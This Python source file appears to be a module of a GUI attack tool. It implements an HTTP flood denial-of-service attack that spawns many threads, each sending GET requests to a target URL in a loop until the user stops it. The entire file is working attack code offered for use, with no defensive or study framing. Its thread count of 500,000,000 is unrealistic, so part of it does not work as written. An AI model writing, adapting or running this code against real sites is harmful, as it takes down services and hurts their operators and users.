import threading
import requests
from gui.dos_attack.stopped_manager import is_stopped

def perform_dos(target_url, console_view):
    """
    Perform a DoS attack by sending a high volume of requests to the target URL.
    This version uses multithreading for higher efficiency.
    """
    def send_request():
        while not is_stopped():
            try:
                response = requests.get(target_url)
                console_view.add_text_schedule(f"[SUCCESS] Sent request, Status Code: {response.status_code}")
            except requests.exceptions.RequestException as e:
                console_view.add_text_schedule(f"[ERROR] Failed to send request: {e}")

    # Number of threads to use
    num_threads = 500000000  # Adjust based on system/server capacity

    console_view.add_text_schedule(f"[INFO] Starting DoS attack on {target_url} with {num_threads} threads. Press 'Stop Attack' to terminate.")
    threads = []

    # Start threads
    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        thread.daemon = True  # Allow threads to exit when the program ends
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

    console_view.add_text_schedule("[INFO] DoS attack stopped or completed.")
